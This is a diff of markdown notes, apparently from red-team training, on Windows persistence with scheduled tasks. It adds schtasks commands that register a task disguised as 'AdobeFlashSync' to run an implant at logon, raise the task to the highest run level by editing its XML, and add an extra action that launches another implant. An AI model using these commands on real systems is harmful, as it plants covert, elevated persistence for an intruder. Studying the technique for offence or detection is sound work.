@@ -18,10 +18,31 @@ schtasks /run /tn "mytasks\go"
 schtasks /create /sc onlogon /tn AdobeFlashSync /tr "c:\rto\pers\implant\implant.exe"
 schtasks /query /tn "AdobeFlashSync" /fo list
 
-schtasks /query /tn AdobeFlashSync /xml 
+# take the configurations from an xml file
+
+# export the task config 
 schtasks /query /tn AdobeFlashSync /xml > c:\RTO\PERS\tsk.xml
+
+#under <principal> section add this tag:
+<RunLevel>HighestAvailable</RunLevel>
+ 
+# then remove the task and make a new one with the modified configuration
 schtasks /delete /f /tn AdobeFlashSync
 schtasks /create /tn AdobeFlashSync /xml c:\RTO\PERS\tsk.xml
+
+# now the privilege level is local admin
+```
+
+## <mark style="color:red;">Multi-action Tasks</mark>
+
+By modifying the task configuration file, we can add additional actions to the scheduled task under `<Actions>` section.
+
+for example we can execute a binary file by adding :
+
+```
+<Exec>
+    <Command>c:\users\rto\desktop\implant.exe</Command>
+</Exec>
 ```
 
 ## <mark style="color:red;">Detection</mark>
